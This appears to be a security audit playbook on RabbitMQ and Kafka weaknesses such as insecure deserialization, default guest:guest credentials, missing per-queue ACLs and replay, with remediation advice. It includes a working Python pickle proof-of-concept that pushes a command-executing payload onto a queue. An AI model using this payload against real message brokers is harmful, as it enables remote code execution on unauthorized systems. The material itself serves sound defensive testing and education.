# Message Queue Security — RabbitMQ & Kafka

**Tags:** #high #mq #rabbitmq #kafka #deserialization #misconfiguration
**OWASP:** A05:2021 Security Misconfiguration / A08:2021 Software and Data Integrity Failures
**CVSS Base:** 7.5 (High) — 8.8 (Critical if leading to consumer-side RCE)

---

## 📖 What it is

Message Queues (MQ) and Event Streams are the backbone of microservices. Security failures occur when internal services "trust" messages coming from the queue without validation, or when the MQ infrastructure itself is exposed or unauthenticated.

---

## 🔍 `grep_search` Tactics

```
amqp
kafkajs
confluent
pika
pika.BlockingConnection
createConsumer
subscribe(
on('message'
consume(
pickle.loads
unserialize
JSON.parse
```

---

## 💣 Attack Category 1: Insecure Deserialization in Consumers

This is the most critical MQ vulnerability. If a consumer uses an insecure deserializer on the message body, an attacker who can push a message to the queue (even a low-privilege service) can achieve RCE on the consumer.

**Vulnerable Patterns:**
- **Python (Pika/Celery):** Using `pickle.loads(body)` on the consumer side.
- **Node.js:** Using `JSON.parse(body)` where the content is then used in a `deepMerge` (Prototype Pollution) or `eval`.
- **PHP:** Using `unserialize($msg->body)`.

**Static Detection:** Trace the `message` callback in the consumer. Look for the first function that processes the `body`.

---

## 💣 Attack Category 2: Default Credentials & Open Management UI

Many MQ installations use default credentials or have their management console exposed.

- **RabbitMQ:** `guest:guest` (default, often only local, but misconfigured to be external).
- **Management UI:** Port `15672` (RabbitMQ) or `9000` (Kafka Manager).

**Grep for connection strings:**
```javascript
amqp://guest:guest@localhost:5672
```

---

## 💣 Attack Category 3: Lack of Per-Queue ACLs

In a shared MQ cluster, if Service A can write to Service B's queue, Service A can potentially trigger administrative actions or exploits on Service B.

**Detection:** Check MQ configuration files (e.g., `rabbitmq.conf`, `definitions.json`) or Terraform scripts for lack of `access_control: write` restrictions.

### [NEW] Event-Bus Hijacking
**How it works:** In event-driven architectures (Pub/Sub), if any service can publish to any topic, an attacker can trigger system-wide events (e.g., `ORDER_SHIPPED` or `USER_DELETED`) without authorization.

### [NEW] Message Replay Attacks
**How it works:** If messages do not contain a unique ID or timestamp validated on the consumer side, an attacker can capture a legitimate message (like a "Grant Premium" command) and re-send it multiple times.

---

## 🧪 Validation Script (RabbitMQ Deserialization)

```python
# .tmp/test_mq_injection.py
import pika, pickle

# Malicious payload for a Python consumer using pickle
class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ('id > /tmp/pwned',))

payload = pickle.dumps(Exploit())

# Push to the target queue
connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
channel = connection.channel()
channel.queue_declare(queue='task_queue')
channel.basic_publish(exchange='', routing_key='task_queue', body=payload)

print("[+] Malicious message sent. Check consumer for RCE.")
connection.close()
```

---

## 🛡️ Fix

1. **Use Secure Serialization:** Use JSON with strict schema validation. Avoid `pickle`, `unserialize`, or language-specific binary formats.
2. **Implement mTLS:** Ensure that only authorized services can connect to the MQ broker.
3. **Strict ACLs:** Use the principle of least privilege. Service A should only have `write` access to its own output queue and `read` access to its input queue.
4. **Encrypt Messages:** Use end-to-end encryption if the MQ contains sensitive PII/secrets.

---

## 🔗 Chain Exploits

```
Low Priv Service RCE + MQ Write access  Push to High Priv Queue  Full lateral movement
Exposed RabbitMQ Management UI + default creds  Read all message traffic  Sensitive data theft
Insecure Deserialization in consumer + MQ message  RCE on consumer service
```

---

## 📌 References
- [RabbitMQ Security Best Practices](https://www.rabbitmq.com/access-control.html)
- [Kafka Security Overview](https://kafka.apache.org/documentation/#security)
- [[insecure-deserialization-protocol]]
